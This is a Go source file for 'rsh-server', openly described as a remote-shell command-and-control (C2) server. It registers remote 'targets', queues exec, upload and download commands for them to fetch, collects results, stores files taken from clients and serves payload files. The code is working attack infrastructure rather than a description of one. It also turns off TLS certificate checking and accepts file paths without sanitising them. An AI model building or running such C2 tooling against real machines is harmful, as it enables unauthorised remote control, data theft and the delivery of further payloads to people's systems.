package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/urfave/cli/v2"
)

// ---------------------------
// Shared Data Structures
// ---------------------------

// Server holds all server-side state, protected by a mutex.
type Server struct {
	mu       sync.RWMutex
	targets  map[string]*Target // Tracks each client by ID
	commands []*Command         // Commands queued for execution
}

// Target stores info about a client (IPAddress, last check-in time, and command results).
type Target struct {
	IPAddress string             `json:"ipaddress"`
	results   map[string]*Result // Map of command IDs to results
	LastSeen  time.Time
}

// Command defines a task to run on a client.
type Command struct {
	ID        string   `json:"id"`
	Type      string   `json:"type"`
	Arguments []string `json:"arguments"`
}

// Result captures the success/failure status and any output from executing a command.
type Result struct {
	Success bool   `json:"success"`
	Output  string `json:"output"`
}

// ---------------------------
// Server Handlers
// ---------------------------

// logIfErr logs the error with a message and (optionally) writes an HTTP error if w is non-nil.
func logIfErr(err error, w http.ResponseWriter, msg string, code int) bool {
	if err == nil {
		return false
	}
	log.Printf("%s: %v", msg, err)
	if w != nil {
		http.Error(w, err.Error(), code)
	}
	return true
}

// CommandHandler: Receives a command result from a client, appends it to results/targetid.txt,
// and if it's a "download" command, saves the file to the requested path on the server.
func (srv *Server) CommandHandler(w http.ResponseWriter, r *http.Request) {
	targetID := mux.Vars(r)["target"]
	cmdID := mux.Vars(r)["command"]

	// Decode the incoming result
	var commandOutput Result
	if err := json.NewDecoder(r.Body).Decode(&commandOutput); logIfErr(err, w, "failed to decode JSON result", http.StatusBadRequest) {
		return
	}
	defer r.Body.Close()

	// --------------------------------------------------------
	// 1. Identify which Command triggered this result
	// --------------------------------------------------------
	srv.mu.RLock()
	var foundCmd *Command
	for _, c := range srv.commands {
		if c.ID == cmdID {
			foundCmd = c
			break
		}
	}
	srv.mu.RUnlock()

	// --------------------------------------------------------
	// 2. If it's a "download" command, store the file on server
	// --------------------------------------------------------
	if foundCmd != nil && foundCmd.Type == "download" && len(foundCmd.Arguments) > 0 {
		serverPath := foundCmd.Arguments[1]

		// Ensure the parent directories exist
		if err := os.MkdirAll(filepath.Dir(serverPath), 0755); logIfErr(err, w, "failed to create parent directories", http.StatusInternalServerError) {
			return
		}

		// Write the file contents (which the client sent as 'commandOutput.Output')
		raw, err := base64.StdEncoding.DecodeString(commandOutput.Output)
		if logIfErr(err, w, "failed to decode downloaded file", http.StatusInternalServerError) {
			return
		}
		err = os.WriteFile(serverPath, raw, 0644)
		if logIfErr(err, w, "failed to write downloaded file to server", http.StatusInternalServerError) {
			return
		}

		log.Printf("Saved file for download command %s at: %s", cmdID, serverPath)
	}

	// Ensure the 'results' directory exists
	resultsDir := "results"
	if err := os.MkdirAll(resultsDir, os.ModePerm); logIfErr(err, w, "failed to create results directory", http.StatusInternalServerError) {
		return
	}

	// Define the single result file for this target
	resultFile := filepath.Join(resultsDir, fmt.Sprintf("%s.txt", targetID))

	// Ensure the file exists by creating it if necessary
	file, err := os.OpenFile(resultFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if logIfErr(err, w, "failed to open result file", http.StatusInternalServerError) {
		return
	}
	defer file.Close()

	// Prepare output format (timestamped for better tracking)
	timestamp := time.Now().UTC().Format("2006-01-02 15:04:05")
	outputEntry := fmt.Sprintf("[%s] Command: %s | Success: %v\n%s\n\n",
		timestamp, cmdID, commandOutput.Success, commandOutput.Output)

	// Append result to the file
	if _, err = file.WriteString(outputEntry); logIfErr(err, w, "failed to write result to file", http.StatusInternalServerError) {
		return
	}

	// Lock and update in-memory results
	srv.mu.Lock()
	defer srv.mu.Unlock()
	tgt, ok := srv.targets[targetID]
	if !ok {
		http.Error(w, "unknown target", http.StatusNotFound)
		return
	}
	tgt.results[cmdID] = &commandOutput
}

// HomeHandler: Simple root endpoint for health checks or quick info.
func HomeHandler(w http.ResponseWriter, _ *http.Request) {
	fmt.Fprint(w, "Connecting back to C2. See /help for usage.")
}

// HelpHandler: Provides brief information about server endpoints.
func HelpHandler(w http.ResponseWriter, _ *http.Request) {
	info := []string{
		"Usage Endpoints:",
		"  [GET]  /help                        -> This help page",
		"  [PUT]  /api/v1/target/{target}      -> Client registers or checks in, receives pending commands",
		"  [PUT]  /api/v1/command/{commandID}  -> Server operator pushes a new command",
		"  [PUT]  /api/v1/target/{t}/command/{c}/result -> Client posts command results",
		"  [GET]  /api/v1/file/{name}          -> Client downloads a file from 'files' directory",
	}
	fmt.Fprint(w, strings.Join(info, "\n"))
}

// ClientRegisterHandler: Registers or updates a client's info, returns any pending commands.
func (srv *Server) ClientRegisterHandler(w http.ResponseWriter, r *http.Request) {
	targetID := mux.Vars(r)["target"]

	var incoming Target
	if err := json.NewDecoder(r.Body).Decode(&incoming); logIfErr(err, w, "failed to decode target info", http.StatusBadRequest) {
		return
	}
	defer r.Body.Close()

	srv.mu.Lock()
	defer srv.mu.Unlock()

	// If target already exists, update. Otherwise create a new entry.
	tgt, exists := srv.targets[targetID]
	if !exists {
		tgt = &Target{
			results: map[string]*Result{},
		}
		srv.targets[targetID] = tgt
	}
	tgt.IPAddress = r.RemoteAddr
	tgt.LastSeen = time.Now().UTC()

	// Build a list of commands this target hasn't run yet.
	pending := make([]*Command, 0)
	for _, c := range srv.commands {
		if _, ok := tgt.results[c.ID]; !ok {
			pending = append(pending, c)
		}
	}

	// Return the new commands as JSON.
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(pending); logIfErr(err, w, "failed to encode response", http.StatusInternalServerError) {
		return
	}
}

// PutCommandHandler: Allows an operator to register or update a command.
func (srv *Server) PutCommandHandler(w http.ResponseWriter, r *http.Request) {
	cmdID := mux.Vars(r)["command"]

	var incoming Command
	if err := json.NewDecoder(r.Body).Decode(&incoming); logIfErr(err, w, "failed to decode command", http.StatusBadRequest) {
		return
	}
	defer r.Body.Close()

	incoming.ID = cmdID

	srv.mu.Lock()
	defer srv.mu.Unlock()

	// If we want to deduplicate by ID, we could search for existing commands. For now, we just append.
	srv.commands = append(srv.commands, &incoming)
	log.Printf("Added or updated command %q: %#v\n", cmdID, incoming)
}

// startServer: Configures and starts the HTTPS server with routes.
func startServer(c *cli.Context) error {
	addr := c.String("addr")
	certPath := c.String("cert")
	keyPath := c.String("key")

	// Prepare TLS credentials
	certificate, err := tls.LoadX509KeyPair(certPath, keyPath)
	if err != nil {
		return fmt.Errorf("failed to load cert/key: %w", err)
	}

	// Initialize the server state
	srv := &Server{
		targets:  make(map[string]*Target),
		commands: make([]*Command, 0),
	}

	router := mux.NewRouter()
	router.HandleFunc("/", HomeHandler)
	router.HandleFunc("/help", HelpHandler).Methods("GET")

	// Server routes for commands & results
	router.HandleFunc("/api/v1/command/{command}", srv.PutCommandHandler).Methods("PUT")
	router.HandleFunc("/api/v1/target/{target}", srv.ClientRegisterHandler).Methods("PUT")
	router.HandleFunc("/api/v1/target/{target}/command/{command}/result", srv.CommandHandler).Methods("PUT")

	// File serving route
	router.HandleFunc("/api/v1/file/{name}", func(w http.ResponseWriter, r *http.Request) {
		name := mux.Vars(r)["name"]
		filePath := filepath.Join("files", name)
		w.Header().Set("Content-Type", "application/octet-stream")
		http.ServeFile(w, r, filePath)
	}).Methods("GET")

	server := &http.Server{
		Addr: addr,
		TLSConfig: &tls.Config{
			Certificates: []tls.Certificate{certificate},
		},
		Handler: router,
	}

	log.Printf("Server listening on %s (TLS)", addr)
	return server.ListenAndServeTLS("", "")
}

// ---------------------------
// Additional: Schedule a Command
// ---------------------------

// Here we define a "schedule" command so we can push a command to the server:
func doSchedule(c *cli.Context) error {
	addr := c.String("addr")
	runType := c.String("run")
	args := c.Args().Slice()

	if runType == "" {
		return errors.New("must provide --run flag")
	}

	clientURL := addr
	if !strings.HasPrefix(clientURL, "http") {
		clientURL = "https://" + clientURL
	}

	// Generate a random ID for tracking (but no longer store by ID)
	cmdID := fmt.Sprintf("%d", time.Now().UnixNano())

	newCmd := Command{
		ID:        cmdID, // Now auto-generated
		Type:      runType,
		Arguments: args,
	}

	// Send PUT request to /api/v1/command/{cmdID}
	route := path.Join("/api/v1/command", cmdID)

	// Insecure by default for demonstration
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	httpClient := &http.Client{Transport: tr}

	fullURL := clientURL + route
	data, err := json.Marshal(newCmd)
	if err != nil {
		return fmt.Errorf("failed to marshal command: %w", err)
	}

	req, err := http.NewRequest(http.MethodPut, fullURL, strings.NewReader(string(data)))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("schedule command received HTTP %d", resp.StatusCode)
	}

	log.Printf("Scheduled command successfully: %q", runType)
	return nil
}

// ---------------------------
// main
// ---------------------------
func main() {
	app := &cli.App{
		Name:  "rsh-server",
		Usage: "Server component for Remote Shell system with TLS",
		Commands: []*cli.Command{
			{
				Name:  "server",
				Usage: "Start the rsh server",
				Flags: []cli.Flag{
					&cli.StringFlag{
						Name:  "addr",
						Value: "0.0.0.0:9000",
						Usage: "Address to listen on",
					},
					&cli.StringFlag{
						Name:  "cert",
						Value: "server.crt",
						Usage: "TLS certificate file",
					},
					&cli.StringFlag{
						Name:  "key",
						Value: "server.key",
						Usage: "TLS private key file",
					},
				},
				Action: startServer,
			},
			{
				Name:   "schedule",
				Usage:  "Schedule a command on the server for clients to pick up",
				Action: doSchedule,
				Flags: []cli.Flag{
					&cli.StringFlag{
						Name:  "addr",
						Value: "https://127.0.0.1:9000",
						Usage: "Server URL to connect to",
					},
					&cli.StringFlag{
						Name:  "id",
						Value: "",
						Usage: "Unique ID for the command",
					},
					&cli.StringFlag{
						Name:  "run",
						Value: "",
						Usage: "Command type (e.g. 'exec', 'upload', etc.)",
					},
				},
			},
		},
	}

	// Parse CLI flags
	flag.Parse()

	if err := app.Run(os.Args); err != nil {
		log.Fatalf("Server application error: %v", err)
	}
}
